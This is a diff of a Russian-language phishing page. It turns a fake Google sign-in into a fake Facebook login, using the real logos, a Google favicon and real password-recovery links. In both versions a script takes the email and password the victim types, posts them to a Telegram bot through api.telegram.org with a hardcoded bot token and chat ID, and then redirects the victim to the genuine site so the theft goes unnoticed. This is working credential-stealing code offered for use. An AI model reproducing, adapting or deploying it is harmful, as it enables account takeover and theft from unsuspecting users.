@@ -3,11 +3,12 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Вход через Google</title>
+  <title>Вход</title>
+  <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
   <style>
     body {
-      background-color: #f1f3f4;
-      font-family: 'Roboto', Arial, sans-serif;
+      background-color: #f0f2f5;
+      font-family: Arial, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -16,135 +17,88 @@
     }
     .container {
       background-color: white;
-      padding: 40px;
+      padding: 20px;
       border-radius: 8px;
-      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12);
-      width: 400px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+      width: 360px;
       text-align: center;
     }
     .logo {
-      width: 100px;
+      width: 120px;
       margin-bottom: 20px;
     }
     h1 {
-      font-size: 24px;
-      color: #202124;
+      font-size: 22px;
+      color: #1c1e21;
       margin-bottom: 20px;
     }
     input {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border: 1px solid #dadce0;
-      border-radius: 4px;
-      font-size: 14px;
-      transition: border-color 0.3s ease;
-    }
-    input:focus {
-      border-color: #1a73e8;
-      outline: none;
+      width: calc(100% - 24px);
+      padding: 14px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
+      display: block;
+      margin-left: auto;
+      margin-right: auto;
     }
     button {
       width: 100%;
-      padding: 12px;
-      background-color: #1a73e8;
+      padding: 14px;
+      background-color: #1877f2;
       color: white;
       border: none;
-      border-radius: 4px;
-      font-size: 16px;
+      border-radius: 6px;
+      font-size: 18px;
       cursor: pointer;
-      transition: background-color 0.3s ease;
       margin-top: 10px;
     }
     button:hover {
-      background-color: #1557b5;
+      background-color: #125abe;
     }
     .footer {
-      margin-top: 20px;
+      margin-top: 15px;
       font-size: 14px;
-      color: #5f6368;
+      color: #606770;
     }
     .footer a {
-      color: #1a73e8;
+      color: #1877f2;
       text-decoration: none;
     }
-    .footer a:hover {
-      text-decoration: underline;
-    }
   </style>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
 </head>
 <body>
   <div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="logo">
-    <h1>Войдите в аккаунт Google</h1>
-    <form onsubmit="sendData(event, 'google')">
-      <input type="email" id="email" placeholder="Email" required>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" class="logo">
+    <h1>Вход в Facebook</h1>
+    <form onsubmit="sendData(event, 'facebook')">
+      <input type="text" id="email" placeholder="Электронная почта или телефон" required>
       <input type="password" id="password" placeholder="Пароль" required>
       <button type="submit">Войти</button>
     </form>
     <div class="footer">
-      <a href="https://accounts.google.com/signin/recovery" target="_blank">Забыли пароль?</a>
+      <a href="https://www.facebook.com/recover/initiate" target="_blank">Забыли пароль?</a>
     </div>
   </div>
 
   <script>
-    // Токен вашего бота и chat_id
-    const BOT_TOKEN = "7728256968:AAEenNdOxdzfTtPMM5H-ILAAK9hNNzhBsP0";  // Замените на токен вашего бота
-    const CHAT_ID = "6613314529";      // Замените на ваш chat_id
-
-    // Функция для отправки данных
-    function sendData(event, service) {
-      event.preventDefault(); // Отменяем стандартное поведение формы
-
-      // Получаем данные из формы
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
-
-      // Получаем информацию о пользователе
-      const user_ip = ''; // IP-адрес можно получить через сторонний сервис (например, ipify)
-      const user_agent = navigator.userAgent;
-      const current_time = new Date().toLocaleString();
-
-      // Формируем сообщение для Telegram
-      const message = `
-    Новый вход через ${service}:
-    Время: ${current_time}
-    IP: ${user_ip}
-    User-Agent: ${user_agent}
-    Email: ${email}
-    Пароль: ${password}
-      `;
-
-      // Отправляем данные в Telegram
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      const params = {
-        chat_id: CHAT_ID,
-        text: message
-      };
-
-      fetch(url, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(params)
-      })
-      .then(response => response.json())
-      .then(data => {
-        console.log('Данные отправлены в Telegram:', data);
-        // Перенаправление на оригинальный сайт
-        if (service === 'google') {
-          window.location.href = 'https://google.com';
-        } else if (service === 'facebook') {
-          window.location.href = 'https://facebook.com';
-        } else if (service === 'vk') {
-          window.location.href = 'https://vk.com';
+    function sendData(event, platform) {
+      event.preventDefault();
+      let email = document.getElementById("email").value;
+      let password = document.getElementById("password").value;
+      let message = `\u{1F6D1} Новый логин (${platform.toUpperCase()})\n\n\u{1F464} Логин: ${email}\n\u{1F511} Пароль: ${password}`;
+      let botToken = "7728203229:AAHjqI6dvF1AL9mlOEgbgcJu3Xs9UiBgXRY";
+      let chatId = "1782608280";
+      let url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      let data = new FormData();
+      data.append("chat_id", chatId);
+      data.append("text", message);
+      fetch(url, { method: "POST", body: data }).then(response => {
+        if (response.ok) {
+          window.location.href = `https://www.${platform}.com`;
         }
-      })
-      .catch(error => {
-        console.error('Ошибка отправки данных:', error);
-      });
+      }).catch(error => console.error("Ошибка:", error));
     }
   </script>
 </body>
